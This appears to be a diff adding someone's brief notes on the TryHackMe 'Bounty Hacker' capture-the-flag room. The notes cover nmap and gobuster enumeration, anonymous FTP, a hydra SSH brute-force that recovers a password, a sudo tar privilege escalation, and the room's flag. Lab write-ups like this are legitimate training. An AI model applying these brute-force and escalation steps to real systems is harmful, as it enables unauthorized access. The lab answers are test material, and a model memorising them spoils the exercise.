@@ -1,0 +1,90 @@
+Bounty Hacker
+nmap -sV -sC -Pn -T4 -p- 10.67.176.204
+PORT      STATE  SERVICE         VERSION
+20/tcp    closed ftp-data
+21/tcp    open   ftp             vsftpd 3.0.5
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.135.91
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV failed: 550 Permission denied.
+22/tcp    open   ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 7e:79:59:b7:a4:b4:c4:1c:6b:8c:29:82:e0:36:cd:4a (RSA)
+|   256 f9:73:4c:c6:96:57:f6:c3:ec:2e:b8:b2:11:52:7a:56 (ECDSA)
+|_  256 0a:b7:d7:8d:3b:bc:fc:18:2c:00:7d:f5:26:75:92:6a (ED25519)
+80/tcp    open   http            Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+
+Used go buster for http enumeration
+
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.67.176.204/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+.htaccess            (Status: 403) [Size: 278]
+.htpasswd            (Status: 403) [Size: 278]
+images               (Status: 301) [Size: 315] [--> http://10.67.176.204/images/]
+javascript           (Status: 301) [Size: 319] [--> http://10.67.176.204/javascript/]
+server-status        (Status: 403) [Size: 278]
+Progress: 20469 / 20469 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+Connected to FTP
+
+got task.txt and locks.txt
+
+locks.txt looks like passwords, maybe for ssh
+
+hydra -l lin -P locks.txt ssh://10.67.176.204:22
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-03 14:38:48
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+[DATA] attacking ssh://10.67.176.204:22/
+[22][ssh] host: 10.67.176.204   login: lin   password: RedDr4gonSynd1cat3
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-03 14:38:54
+
+Acessed ssh
+sudo -l To list sudo commands
+Matching Defaults entries for lin on ip-10-67-176-204:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on ip-10-67-176-204:
+    (root) /bin/tar
+did Privilage Escalation using tar.
+THM{80UN7Y_h4cK3r}
+
+
+
